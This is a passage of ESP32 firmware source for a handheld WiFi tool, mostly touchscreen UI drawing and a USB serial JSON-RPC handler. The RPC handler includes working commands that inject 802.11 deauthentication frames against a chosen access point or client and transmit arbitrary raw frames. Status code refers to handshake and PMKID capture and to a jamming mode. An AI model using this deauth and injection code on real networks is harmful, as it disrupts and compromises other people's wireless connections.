    hasTarget ? target.ssid.c_str() : "-",
    hasTarget ? target.channel : -1,
    sniffActive ? 1 : 0,
    autoModeStr(autoMode),
    lockChannel ? 1 : 0,
    sniffPps,
    (unsigned long)sniffPacketCount,
    (unsigned long)sniffDroppedPackets,
    (unsigned long)sniffWriteErrors,
    sdReady ? 1 : 0,
    nd_usb_msc_active() ? 1 : 0,
    nd_usb_msc_host_mounted() ? 1 : 0,
    nd_usb_msc_sd_app_locked() ? 1 : 0,
    configDirty ? 1 : 0
  );
}

static void verboseHeartbeatTick() {
  // Periodic heartbeat disabled to keep serial console clean.
}

static String bytesToHex(const uint8_t* data, size_t len) {
  static const char* hex = "0123456789ABCDEF";
  String out;
  out.reserve(len * 2);
  for (size_t i = 0; i < len; i++) {
    uint8_t b = data[i];
    out += hex[(b >> 4) & 0x0F];
    out += hex[b & 0x0F];
  }
  return out;
}

static bool usbHexToBytes(const String& in, uint8_t* out, int maxLen, int& outLen) {
  outLen = 0;
  int n = in.length();
  if (n <= 0 || (n % 2) != 0) return false;
  if ((n / 2) > maxLen) return false;
  auto nib = [](char c) -> int {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return 10 + (c - 'a');
    if (c >= 'A' && c <= 'F') return 10 + (c - 'A');
    return -1;
  };
  for (int i = 0; i < n; i += 2) {
    int hi = nib(in[i]);
    int lo = nib(in[i + 1]);
    if (hi < 0 || lo < 0) return false;
    out[outLen++] = (uint8_t)((hi << 4) | lo);
  }
  return true;
}

static void fillStatusJson(JsonDocument& doc) {
  doc["ok"] = true;
  doc["name"] = ND_PROFILE_CODE;
  doc["mode"] = (int)screen;
  doc["autoMode"] = autoModeStr(autoMode);
  doc["sniffActive"] = sniffActive;
  doc["lockChannel"] = lockChannel;
  doc["apMode"] = apMode;
  doc["webServer"] = webServerRunning;
  doc["sdReady"] = sdReady;
  doc["packets"] = sniffPacketCount;
  doc["beacons"] = monBeaconHits;
  doc["handshakes"] = monHandshakeHits;
  doc["ip_sta"] = WiFi.localIP().toString();
  doc["ip_ap"] = WiFi.softAPIP().toString();
  if (autoMode == AutoMode::Y0INK && YoinkEngine::isRunning()) {
    JsonObject yoink = doc["yoink"].to<JsonObject>();
    yoink["state"] = YoinkEngine::getStateStr();
    yoink["hs"] = YoinkEngine::getHandshakeCount();
    yoink["pmkid"] = YoinkEngine::getPmkidCount();
    yoink["nets"] = YoinkEngine::getNetworkCount();
    yoink["deauths"] = YoinkEngine::getDeauthCount();
    yoink["target"] = YoinkEngine::getTargetSSID();
  }
}

static void fillConsoleJson(JsonDocument& doc, uint32_t since, int limit) {
  if (limit < 1) limit = 1;
  if (limit > 200) limit = 200;
  doc["ok"] = true;
  doc["next_seq"] = consoleSeq + 1;
  JsonArray lines = doc["lines"].to<JsonArray>();
  uint16_t emitted = 0;
  for (uint16_t i = 0; i < CONSOLE_RING_SIZE && emitted < (uint16_t)limit; i++) {
    const ConsoleEvent& e = consoleRing[(consoleHead + i) % CONSOLE_RING_SIZE];
    if (e.seq == 0 || e.seq <= since) continue;
    JsonObject o = lines.add<JsonObject>();
    o["seq"] = e.seq;
    o["ms"] = e.ms;
    o["level"] = e.level;
    o["tag"] = e.tag;
    o["msg"] = e.msg;
    emitted++;
  }
}

static void fillPacketsJson(JsonDocument& doc, uint32_t since, int limit) {
  if (limit < 1) limit = 1;
  if (limit > 260) limit = 260;
  doc["ok"] = true;
  JsonArray lines = doc["lines"].to<JsonArray>();
  portENTER_CRITICAL(&packetRingMux);
  uint16_t emitted = 0;
  for (uint16_t i = 0; i < PACKET_RING_SIZE && emitted < (uint16_t)limit; i++) {
    const PacketEvent& p = packetRing[(packetHead + i) % PACKET_RING_SIZE];
    if (p.seq == 0 || p.seq <= since) continue;
    char src[18], dst[18], bssid[18];
    macToStr(p.addr2, src);
    macToStr(p.addr1, dst);
    macToStr(p.addr3, bssid);
    JsonObject o = lines.add<JsonObject>();
    o["seq"] = p.seq;
    o["ms"] = p.ms;
    o["type"] = p.type;
    o["subtype"] = p.subtype;
    o["len"] = p.len;
    o["rssi"] = p.rssi;
    o["ch"] = p.channel;
    o["src"] = src;
    o["dst"] = dst;
    o["bssid"] = bssid;
    emitted++;
  }
  doc["next_seq"] = packetSeq + 1;
  portEXIT_CRITICAL(&packetRingMux);
}

static void usbRpcSendJson(uint32_t id, JsonDocument& doc) {
  doc["id"] = id;
  String out;
  serializeJson(doc, out);
  Serial.println(out);
}

static void usbRpcSendError(uint32_t id, const char* err) {
  JsonDocument doc;
  doc["ok"] = false;
  doc["error"] = err ? err : "error";
  usbRpcSendJson(id, doc);
}

static bool saveScreenshotToSd(char* outPath, size_t outPathLen);
#if defined(NEONDRIVE_TARGET_M5TAB5)
static void drawTab5ScreenshotOverlay();
#endif

static void handleSerialRpcLine(const String& lineRaw) {
  String line = lineRaw;
  line.trim();
  if (line.isEmpty()) return;

  // Keep existing single-key debug behavior.
  if (line.length() == 1) {
    char c = (char)tolower(line[0]);
    if (c == 'v') {
      verboseSerial = !verboseSerial;
      Serial.printf("[dbg] verbose=%s\n", verboseSerial ? "ON" : "OFF");
      if (verboseSerial) printRuntimeStatus();
      return;
    }
    if (c == 's') {
      printRuntimeStatus();
      return;
    }
  }

  if (!line.startsWith("{")) return;

  JsonDocument req;
  DeserializationError derr = deserializeJson(req, line);
  if (derr) return;

  uint32_t id = req["id"] | 0;
  String cmd = req["cmd"] | "";
  cmd.toLowerCase();
  if (cmd.isEmpty()) {
    usbRpcSendError(id, "missing cmd");
    return;
  }

  if (cmd == "status") {
    JsonDocument doc;
    fillStatusJson(doc);
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "console") {
    uint32_t since = req["since"] | 0;
    int limit = req["limit"] | 80;
    JsonDocument doc;
    fillConsoleJson(doc, since, limit);
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "packets") {
    uint32_t since = req["since"] | 0;
    int limit = req["limit"] | 120;
    JsonDocument doc;
    fillPacketsJson(doc, since, limit);
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "list") {
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      usbRpcSendError(id, "sd unavailable");
      return;
    }
    String path = normalizeSdWebPath((const char*)(req["path"] | "/"));
    if (path.isEmpty()) {
      usbRpcSendError(id, "invalid path");
      return;
    }
    if (!SD.exists(path)) {
      usbRpcSendError(id, "path not found");
      return;
    }
    File dir = SD.open(path, FILE_READ);
    if (!dir || !dir.isDirectory()) {
      if (dir) dir.close();
      usbRpcSendError(id, "not a directory");
      return;
    }
    JsonDocument doc;
    doc["ok"] = true;
    doc["path"] = path;
    JsonArray items = doc["items"].to<JsonArray>();
    while (true) {
      File entry = dir.openNextFile();
      if (!entry) break;
      String fullPath = entry.name();
      if (!fullPath.startsWith("/")) {
        fullPath = path;
        if (!fullPath.endsWith("/")) fullPath += "/";
        fullPath += entry.name();
      }
      String baseName = fullPath.substring(fullPath.lastIndexOf('/') + 1);
      bool isDir = entry.isDirectory();
      uint32_t size = (uint32_t)entry.size();
      entry.close();
      JsonObject o = items.add<JsonObject>();
      o["name"] = baseName;
      o["path"] = fullPath;
      o["dir"] = isDir;
      o["size"] = size;
    }
    dir.close();
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "download_begin") {
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      usbRpcSendError(id, "sd unavailable");
      return;
    }
    String path = normalizeSdWebPath((const char*)(req["path"] | "/"));
    if (path.isEmpty() || path == "/") {
      usbRpcSendError(id, "invalid path");
      return;
    }
    if (!SD.exists(path)) {
      usbRpcSendError(id, "file not found");
      return;
    }
    File f = SD.open(path, FILE_READ);
    if (!f || f.isDirectory()) {
      if (f) f.close();
      usbRpcSendError(id, "not a file");
      return;
    }
    usbDlPath = path;
    usbDlSize = (size_t)f.size();
    usbDlToken = String((uint32_t)millis(), HEX) + String((uint32_t)esp_random(), HEX);
    f.close();
    JsonDocument doc;
    doc["ok"] = true;
    doc["token"] = usbDlToken;
    doc["size"] = (uint32_t)usbDlSize;
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "download_chunk") {
    String token = (const char*)(req["token"] | "");
    if (token.isEmpty() || token != usbDlToken || usbDlPath.isEmpty()) {
      usbRpcSendError(id, "invalid token");
      return;
    }
    size_t offset = (size_t)((uint32_t)(req["offset"] | 0));
    int maxBytes = req["max"] | 192;
    if (maxBytes < 32) maxBytes = 32;
    if (maxBytes > 512) maxBytes = 512;
    if (offset > usbDlSize) offset = usbDlSize;

    File f = SD.open(usbDlPath, FILE_READ);
    if (!f) {
      usbRpcSendError(id, "open failed");
      return;
    }
    if (!f.seek(offset)) {
      f.close();
      usbRpcSendError(id, "seek failed");
      return;
    }
    uint8_t buf[512];
    int n = f.read(buf, maxBytes);
    f.close();
    if (n < 0) n = 0;
    size_t nextOffset = offset + (size_t)n;
    bool eof = (nextOffset >= usbDlSize);
    JsonDocument doc;
    doc["ok"] = true;
    doc["offset"] = (uint32_t)offset;
    doc["eof"] = eof;
    doc["hex"] = bytesToHex(buf, (size_t)n);
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "download_end") {
    String token = (const char*)(req["token"] | "");
    if (token == usbDlToken) {
      usbDlToken = "";
      usbDlPath = "";
      usbDlSize = 0;
    }
    JsonDocument doc;
    doc["ok"] = true;
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "control") {
    String name = (const char*)(req["name"] | "");
    name.toUpperCase();
    JsonDocument doc;
    doc["ok"] = true;
    if (name == "PING") {
      doc["msg"] = "pong";
    } else if (name == "SET_BRIGHT") {
      int v = req["val"] | 255;
      if (v < 0) v = 0;
      if (v > 255) v = 255;
      applyBacklightLevel((uint8_t)v);
      doc["val"] = v;
    } else if (name == "SET_CONFIG") {
      String key = (const char*)(req["key"] | "");
      if (key == "wifi_enableDeauth") {
        cfg.wifi_enableDeauth = req["val"] | false;
        configDirty = true;
        doc["val"] = cfg.wifi_enableDeauth;
      } else {
        doc["ok"] = false;
        doc["error"] = "unknown config key";
      }
    } else if (name == "SET_MODE") {
      String mode = (const char*)(req["mode"] | "");
      mode.toUpperCase();
      if (mode == "NONE") {
        disengageAutoMode();
      } else if (mode == "Y0INK") {
        engageAutoMode(AutoMode::Y0INK);
      } else if (mode == "RAW") {
        engageAutoMode(AutoMode::SP3CTER);
      } else if (mode == "SCOPE") {
        engageAutoMode(AutoMode::SCOPE);
      } else if (mode == "JAMMIT") {
        engageAutoMode(AutoMode::JAMMIT);
      } else {
        doc["ok"] = false;
        doc["error"] = "unknown mode";
      }
      doc["autoMode"] = autoModeStr(autoMode);
    } else if (name == "SET_WIFI") {
      String mode = (const char*)(req["mode"] | "");
      mode.toUpperCase();
      if (mode == "WIFI_OFF") {
        if (apMode) startAPMode();
        WiFi.mode(WIFI_OFF);
      } else if (mode == "WIFI_STA") {
        if (apMode) startAPMode();
        WiFi.mode(WIFI_STA);
      } else if (mode == "WIFI_AP") {
        if (!apMode) startAPMode();
      } else if (mode == "WIFI_AP_STA") {
        WiFi.mode(WIFI_AP_STA);
      } else {
        doc["ok"] = false;
        doc["error"] = "unknown wifi mode";
      }
      doc["mode"] = mode;
    } else if (name == "SCREENSHOT") {
      char shotPath[36] = {0};
      if (saveScreenshotToSd(shotPath, sizeof(shotPath))) {
        doc["path"] = shotPath;
      } else {
        doc["ok"] = false;
        doc["error"] = "screenshot failed";
      }
    } else {
      doc["ok"] = false;
      doc["error"] = "unknown control";
    }
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "c6test") {
    String step = (const char*)(req["step"] | "");
    step.toLowerCase();
    JsonDocument doc;
    doc["ok"] = false;
    doc["cmd"] = "c6test";
    doc["step"] = step;

    if (step == "sdio_init") {
      esp_err_t er = neon_rf_c6test_sdio_init();
      doc["ok"] = (er == ESP_OK);
      doc["err"] = (int)er;
      usbRpcSendJson(id, doc);
      return;
    }

    if (step == "scan_once") {
      Serial.println("[c6test] step=scan_once start");
      doWifiScanBlocking();
      Serial.printf("[c6test] step=scan_once ok ap_count=%d\n", apCount);
      doc["ok"] = true;
      doc["ap_count"] = apCount;
      usbRpcSendJson(id, doc);
      return;
    }

    if (step == "scan_ui_check") {
      Serial.println("[c6test] step=scan_ui_check start");
      Serial.printf("[c6test] ui.ap_count=%d\n", apCount);
      if (apCount > 0) {
        Serial.println("[c6test] step=scan_ui_check ok");
        doc["ok"] = true;
      } else {
        Serial.println("[c6test] step=scan_ui_check fail reason=no_aps");
        doc["ok"] = false;
        doc["error"] = "no_aps";
      }
      doc["ap_count"] = apCount;
      usbRpcSendJson(id, doc);
      return;
    }

    Serial.printf("[c6test] step=%s fail reason=unknown_step\n", step.c_str());
    doc["error"] = "unknown_step";
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "ai_frames") {
    JsonDocument doc;
    doc["ok"] = false;
    doc["error"] = "usb ai_frames not implemented";
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "ai_inject_raw") {
    JsonDocument doc;
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
    neon_rf_set_last_action("usb_ai_inject_raw");
    doc["ok"] = false;
    doc["error"] = "rf_unsupported";
    doc["backend"] = neon_rf_get_caps()->backend_name;
    usbRpcSendJson(id, doc);
    return;
#endif
    String hex = (const char*)(req["frame"] | "");
    int channel = req["channel"] | 1;
    uint8_t payload[900];
    int payloadLen = 0;
    if (!usbHexToBytes(hex, payload, sizeof(payload), payloadLen) || payloadLen <= 0) {
      doc["ok"] = false;
      doc["error"] = "invalid frame hex";
      usbRpcSendJson(id, doc);
      return;
    }
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    esp_err_t tx = esp_wifi_80211_tx(WIFI_IF_STA, payload, payloadLen, false);
    doc["ok"] = (tx == ESP_OK);
    doc["err"] = (int)tx;
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "ai_inject_deauth") {
    JsonDocument doc;
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
    neon_rf_set_last_action("usb_ai_inject_deauth");
    doc["ok"] = false;
    doc["error"] = "rf_unsupported";
    doc["backend"] = neon_rf_get_caps()->backend_name;
    usbRpcSendJson(id, doc);
    return;
#endif
    String bssidStr = (const char*)(req["bssid"] | "");
    String clientStr = (const char*)(req["client"] | "FF:FF:FF:FF:FF:FF");
    int reason = req["reason"] | 7;
    int count = req["count"] | 5;
    int channel = req["channel"] | 1;
    uint8_t bssid[6], client[6];
    if (!macFromString(bssidStr.c_str(), bssid) || !macFromString(clientStr.c_str(), client)) {
      doc["ok"] = false;
      doc["error"] = "invalid mac";
      usbRpcSendJson(id, doc);
      return;
    }
    if (count < 1) count = 1;
    if (count > 20) count = 20;
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    int sent = 0;
    for (int i = 0; i < count; i++) {
      sendDeauthFrame(bssid, client, (uint8_t)reason);
      sent++;
      delay(2);
    }
    doc["ok"] = true;
    doc["sent"] = sent;
    usbRpcSendJson(id, doc);
    return;
  }

  usbRpcSendError(id, "unknown cmd");
}

static void handleSerialDebugCommands() {
  static String serialLine;
  while (Serial.available() > 0) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      if (!serialLine.isEmpty()) {
        handleSerialRpcLine(serialLine);
        serialLine = "";
      }
      continue;
    }
    if (serialLine.length() < 2048) {
      serialLine += c;
    }
  }
}

struct Button { int x, y, w, h; const char* label; };
static constexpr int UI_TOP_BUTTON_SHIFT_Y = 0;
static constexpr int UI_TOP_BUTTON_SHIFT_THRESHOLD_Y = 0;

static inline int buttonRenderYOffset(const Button& b) {
  // Target Ops uses its own explicit geometry; don't apply global top shift there.
  if (screen == ScreenId::TARGET_DETAILS) return 0;
  // Global top-button offset is disabled.
  return (b.y <= UI_TOP_BUTTON_SHIFT_THRESHOLD_Y) ? UI_TOP_BUTTON_SHIFT_Y : 0;
}

static bool hit(const Button& b, int px, int py) {
  const int yOff = buttonRenderYOffset(b);
  const int by = b.y + yOff;
  return (px >= b.x && px < (b.x + b.w) && py >= by && py < (by + b.h));
}

// home‑screen geometry constants
static constexpr int HOME_BTN_COLS = 3;
static constexpr int HOME_BTN_ROWS = 3;
static constexpr int HOME_BTN_COUNT = 9;
// UI metrics — populated from neon_hal_ui_metrics() in initUiMetrics().
// All draw code reads from g_ui; no #ifdef blocks in feature code.
static const neon_hal_ui_t *g_ui = nullptr;

// Forward declarations — defined after initUiMetrics() below.
static void applyFontSm();
static void applyFontMd();
static void applyFontLg();
static void applyFontMono();

// utility for picking neon border colour; indexed same order as labels below.
static uint16_t homeBtnBorderColor(int idx) {
  // neon palette for 9 home buttons
  static const uint16_t colours[HOME_BTN_COUNT] = {
    0x07E0, 0xF81F, 0xF800,
    0xFFE0, 0x07E0, 0xF81F,
    0x07FF, 0xFD20, 0x07FF
  };
  return colours[idx % HOME_BTN_COUNT];
}

static void drawButton(const Button& b, uint16_t fill, uint16_t border, uint16_t text) {
  const int yOff = buttonRenderYOffset(b);
  // Render button at ~95% of logical hitbox size for better text fit.
  const int drawW = (b.w * 95) / 100;
  const int drawH = (b.h * 95) / 100;
  const int drawX = b.x + (b.w - drawW) / 2;
  const int drawY = (b.y + yOff) + (b.h - drawH) / 2;
  const int r = (drawH >= 28) ? 8 : 6;

  tft.fillRoundRect(drawX, drawY, drawW, drawH, r, fill);
  tft.drawRoundRect(drawX, drawY, drawW, drawH, r, border);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(text, fill);

  // Keep labels inside button bounds; shrink only when needed.
  const bool isJustGoHomeLabel = (b.label && strcmp(b.label, "Just Go") == 0);
  const int labelInsetPx = isJustGoHomeLabel ? 4 : 10;
  // Named-font path (Tab5): try md → sm → fall back to integer size 2.
  // Integer path (CYD): decrement text size until text fits.
  if (g_ui && g_ui->font_md) {
    applyFontMd();
    if (tft.textWidth(b.label) > (drawW - labelInsetPx)) {
      applyFontSm();
      if (tft.textWidth(b.label) > (drawW - labelInsetPx)) {
        applyFont(nullptr, g_ui ? g_ui->text_size_md : 2);
      }
    }
  } else {
    int labelSize = g_ui ? g_ui->text_size_md : 2;
    tft.setTextSize(labelSize);
    while (labelSize > 1 && tft.textWidth(b.label) > (drawW - labelInsetPx)) {
      --labelSize;
      tft.setTextSize(labelSize);
    }
  }
  tft.drawString(b.label, drawX + (drawW / 2), drawY + (drawH / 2));
}

static void drawHomeGlyph(const char* label, int cx, int cy, int iconW, int iconH, uint16_t col) {
  if (!label) return;
  if (strcmp(label, "Just Go") == 0) {
    const int step = max(6, iconW / 5);
    tft.fillTriangle(cx - step, cy - iconH / 3, cx + step / 2, cy, cx - step, cy + iconH / 3, col);
    tft.fillTriangle(cx, cy - iconH / 3, cx + step + step / 2, cy, cx, cy + iconH / 3, col);
  } else if (strcmp(label, "WiFi") == 0) {
    // Classic centered WiFi glyph: top arches + node below (no drawArc dependency).
    const int baseY = cy + 1;
    const int rOuter = max(8, min(iconW / 2 - 3, iconH / 2));
    const int rMid   = max(6, rOuter - 4);
    const int rInner = max(4, rMid - 3);
    const auto drawTopBand = [&](int r, int thk) {
      for (int t = 0; t < thk; ++t) tft.drawCircle(cx, baseY, r - t, col);
      // Mask lower half so only top arc remains.
      tft.fillRect(cx - r - 2, baseY, (r * 2) + 4, r + 6, TFT_BLACK);
    };
    drawTopBand(rOuter, 3);
    drawTopBand(rMid, 3);
    drawTopBand(rInner, 2);
    tft.fillCircle(cx, baseY + rInner + 4, 3, col);
  } else if (strcmp(label, "GPS") == 0) {
    // Satellite body + solar panels + orbit ring
    const int body = max(8, iconH / 3);
    const int half = body / 2;
    tft.drawRect(cx - half, cy - half, body, body, col);
    tft.drawRect(cx - half + 2, cy - half + 2, body - 4, body - 4, col);
    tft.fillCircle(cx, cy, 1, col);
    const int panelW = max(6, body - 2);
    const int panelH = max(3, body / 3);
    tft.drawRect(cx - half - panelW - 3, cy - panelH / 2, panelW, panelH, col);
    tft.drawRect(cx + half + 3, cy - panelH / 2, panelW, panelH, col);
    tft.drawLine(cx - half, cy, cx - 4, cy, col);
    tft.drawLine(cx + half, cy, cx + 4, cy, col);
    tft.drawCircle(cx, cy, max(8, iconH / 3), col);
    tft.drawLine(cx + 2, cy + 2, cx + max(9, iconH / 2), cy - max(7, iconH / 3), col);
    tft.fillCircle(cx + max(9, iconH / 2), cy - max(7, iconH / 3), 1, col);
  } else if (strcmp(label, "Logs") == 0) {
    const int rw = iconW / 2;
    const int rh = iconH / 2;
    const int x0 = cx - rw / 2;
    const int y0 = cy - rh / 2;
    tft.drawRect(x0, y0, rw, rh, col);
    tft.fillTriangle(x0 + rw - 8, y0, x0 + rw, y0 + 8, x0 + rw - 8, y0 + 8, col);
    tft.drawFastHLine(x0 + 4, y0 + 12, rw - 10, col);
    tft.drawFastHLine(x0 + 4, y0 + 18, rw - 10, col);
  } else if (strcmp(label, "Target") == 0) {
    tft.drawCircle(cx, cy, iconH / 3, col);
    tft.drawCircle(cx, cy, iconH / 6, col);
    tft.drawFastHLine(cx - iconW / 3, cy, (iconW * 2) / 3, col);
    tft.drawFastVLine(cx, cy - iconH / 3, (iconH * 2) / 3, col);
  } else if (strcmp(label, "Recon") == 0) {
    tft.drawCircle(cx, cy, iconH / 3, col);
    tft.drawCircle(cx, cy, iconH / 6, col);
    tft.drawLine(cx, cy, cx + iconW / 4, cy - iconH / 4, col);
    tft.fillCircle(cx, cy, 2, col);
  } else if (strcmp(label, "Config") == 0) {
    tft.drawCircle(cx, cy, iconH / 5, col);
    for (int i = 0; i < 8; ++i) {
      const float a = (float)i * 0.7853982f;
      const int x1 = cx + (int)(cosf(a) * (iconH / 4));
      const int y1 = cy + (int)(sinf(a) * (iconH / 4));
      const int x2 = cx + (int)(cosf(a) * (iconH / 3));
      const int y2 = cy + (int)(sinf(a) * (iconH / 3));
      tft.drawLine(x1, y1, x2, y2, col);
    }
  } else if (strcmp(label, "Net Scan") == 0) {
    // Network hierarchy tree: one root node branching to two child nodes.
    const int box = max(4, min(iconW, iconH) / 5);
    const int rootX = cx - (box / 2);
    const int rootY = cy - box - 5;
    const int leftX = cx - box - 6;
    const int rightX = cx + 6;
    const int childY = cy + 4;

    tft.drawRect(rootX, rootY, box, box, col);
    tft.drawRect(leftX, childY, box, box, col);
    tft.drawRect(rightX, childY, box, box, col);

    const int rootBottomX = rootX + (box / 2);
    const int rootBottomY = rootY + box;
    const int splitY = rootBottomY + 4;
    const int leftTopX = leftX + (box / 2);
    const int rightTopX = rightX + (box / 2);

    tft.drawLine(rootBottomX, rootBottomY, rootBottomX, splitY, col);
    tft.drawLine(leftTopX, childY, leftTopX, splitY, col);
    tft.drawLine(rightTopX, childY, rightTopX, splitY, col);
    tft.drawLine(leftTopX, splitY, rightTopX, splitY, col);
  } else if (strcmp(label, "Packet Lab") == 0) {
    tft.fillCircle(cx - 8, cy - 5, 3, col);
    tft.fillCircle(cx + 8, cy - 5, 3, col);
    tft.fillRect(cx - 10, cy + 2, 20, 8, col);
    tft.fillRect(cx - 6, cy + 10, 3, 4, col);
    tft.fillRect(cx + 3, cy + 10, 3, 4, col);
  }
}

static void drawHomeButton(const Button& b, uint16_t border, uint16_t text) {
  const int yOff = buttonRenderYOffset(b);
  const int drawW = (b.w * 95) / 100;
  const int drawH = (b.h * 95) / 100;
  const int drawX = b.x + (b.w - drawW) / 2;
  const int drawY = (b.y + yOff) + (b.h - drawH) / 2;
  const int r = (drawH >= 36) ? 8 : 6;
  const int labelBandH = max(11, drawH / 3);
  const int iconH = drawH - labelBandH - 3;

  tft.fillRoundRect(drawX, drawY, drawW, drawH, r, TFT_BLACK);
  tft.drawRoundRect(drawX, drawY, drawW, drawH, r, border);
  tft.drawRoundRect(drawX + 2, drawY + 2, drawW - 4, drawH - 4, r - 2, border);
  tft.drawFastHLine(drawX + 6, drawY + iconH, drawW - 12, border);
  tft.drawFastHLine(drawX + 6, drawY + iconH + 1, drawW - 12, 0x2945);

  const int cx = drawX + drawW / 2;
  const int cy = drawY + iconH / 2 + 1;
  drawHomeGlyph(b.label, cx, cy, drawW - 16, iconH - 6, border);

  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(text, TFT_BLACK);
  if (g_ui && g_ui->font_sm) {
    applyFontSm();
    if (tft.textWidth(b.label) > (drawW - 10)) {
      applyFont(nullptr, g_ui ? g_ui->text_size_sm : 1);
    }
  } else {
    int labelSize = g_ui ? g_ui->text_size_sm : 1;
    tft.setTextSize(labelSize);
    while (labelSize > 1 && tft.textWidth(b.label) > (drawW - 10)) {
      --labelSize;
      tft.setTextSize(labelSize);
    }
  }
  tft.drawString(b.label, cx, drawY + iconH + (labelBandH / 2));
}

static int ActionDockBoxX = 0;
static int ActionDockBoxY = 2;
static int ActionDockBoxW = 24;
static int ActionDockBoxH = 24;
static constexpr int ActionDock_CLEARANCE_PX = 5;
static const char* currentHeaderTitle = nullptr;
static void layoutActionDockBox();

// ---------- Shared UI Layout System ----------
#ifndef UI_DEBUG
#define UI_DEBUG 0
#endif

#if UI_DEBUG
#define UI_LOGF(...) Serial.printf(__VA_ARGS__)
#else
#define UI_LOGF(...) do {} while (0)
#endif

#ifndef UI_DEBUG_MEM
#define UI_DEBUG_MEM 0
#endif

#ifndef MEM_BUDGET_MIN_FREE_HEAP
#define MEM_BUDGET_MIN_FREE_HEAP (40U * 1024U)
#endif

#if UI_DEBUG_MEM
extern "C" {
  extern uint8_t _data_start;
  extern uint8_t _data_end;
  extern uint8_t _bss_start;
  extern uint8_t _bss_end;
}

static void uiMemLog(const char* tag) {
  const uint32_t free8 = (uint32_t)heap_caps_get_free_size(MALLOC_CAP_8BIT);
  const uint32_t largest8 = (uint32_t)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
  const uint32_t freeHeap = (uint32_t)ESP.getFreeHeap();
  const uint32_t heapSize = (uint32_t)ESP.getHeapSize();
  const uint32_t sketchSize = (uint32_t)ESP.getSketchSize();
  const uint32_t freeSketch = (uint32_t)ESP.getFreeSketchSpace();
  Serial.printf("[mem] %s free8=%lu largest8=%lu freeHeap=%lu heapSize=%lu sketch=%lu freeSketch=%lu",
                tag ? tag : "(null)",
                (unsigned long)free8,
                (unsigned long)largest8,
                (unsigned long)freeHeap,
                (unsigned long)heapSize,
                (unsigned long)sketchSize,
                (unsigned long)freeSketch);
#if defined(BOARD_HAS_PSRAM) && BOARD_HAS_PSRAM
  if (psramFound()) {
    Serial.printf(" psramFree=%lu psramSize=%lu",
                  (unsigned long)ESP.getFreePsram(),
                  (unsigned long)ESP.getPsramSize());
  } else {
    Serial.print(" psram=absent");
  }
#else
  Serial.print(" psram=disabled");
#endif
  Serial.println();
}

static void uiMemBudgetBoot() {
  const uint32_t dataBytes = (uint32_t)(&_data_end - &_data_start);
  const uint32_t bssBytes = (uint32_t)(&_bss_end - &_bss_start);
  const uint32_t staticBytes = dataBytes + bssBytes;
  const uint32_t free8 = (uint32_t)heap_caps_get_free_size(MALLOC_CAP_8BIT);
  const uint32_t largest8 = (uint32_t)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
  Serial.printf("[mem-budget] free8=%lu largest8=%lu data=%lu bss=%lu static=%lu min_safe=%lu\n",
                (unsigned long)free8,
                (unsigned long)largest8,
                (unsigned long)dataBytes,
                (unsigned long)bssBytes,
                (unsigned long)staticBytes,
                (unsigned long)MEM_BUDGET_MIN_FREE_HEAP);
  if (free8 < MEM_BUDGET_MIN_FREE_HEAP) {
    Serial.printf("[mem-budget][WARN] free8=%lu below threshold=%lu\n",
                  (unsigned long)free8,
                  (unsigned long)MEM_BUDGET_MIN_FREE_HEAP);
  }
}
#else
static inline void uiMemLog(const char*) {}
static inline void uiMemBudgetBoot() {}
#endif

// Layout constants — set from g_ui in initUiMetrics(), called early in setup().
static int UI_SAFE_MARGIN  = 8;
static int UI_TOP_GAP      = 6;
static int UI_BOTTOM_BAR_H = 36;
static int UI_BUTTON_H     = 30;
static int UI_BUTTON_GAP   = 6;
static int UI_HYPERCUB_RESERVE_X = 0;
static int UI_HYPERCUB_RESERVE_Y = 0;
static int UI_HYPERCUB_RESERVE_W = 0;
static int UI_HYPERCUB_RESERVE_H = 0;

static void initUiMetrics() {
  g_ui = neon_hal_ui_metrics();
  UI_SAFE_MARGIN  = g_ui->safe_margin;
  UI_TOP_GAP      = g_ui->top_gap;
  UI_BOTTOM_BAR_H = g_ui->bottom_bar_h;
  UI_BUTTON_H     = g_ui->btn_h;
  UI_BUTTON_GAP   = g_ui->btn_gap;
  UI_HYPERCUB_RESERVE_X = g_ui->reserve_x;
  UI_HYPERCUB_RESERVE_Y = g_ui->reserve_y;
  UI_HYPERCUB_RESERVE_W = g_ui->reserve_w;
  UI_HYPERCUB_RESERVE_H = g_ui->reserve_h;
}

// Apply a named font (Tab5) or fall back to integer text-size (CYD).
// Always call this instead of tft.setTextSize() directly.
static void applyFont(const void *font, int fallback_size) {
#if defined(NEONDRIVE_USES_M5GFX)
  if (font) {
    tft.setFont(static_cast<const lgfx::IFont *>(font));
    tft.setTextSize(1);
    return;
  }
  tft.setFont(nullptr);
#endif
  tft.setTextSize(fallback_size);
}
static void applyFontSm()   { applyFont(g_ui ? g_ui->font_sm   : nullptr, g_ui ? g_ui->text_size_sm : 1); }
static void applyFontMd()   { applyFont(g_ui ? g_ui->font_md   : nullptr, g_ui ? g_ui->text_size_md : 2); }
static void applyFontLg()   { applyFont(g_ui ? g_ui->font_lg   : nullptr, g_ui ? g_ui->text_size_lg : 3); }
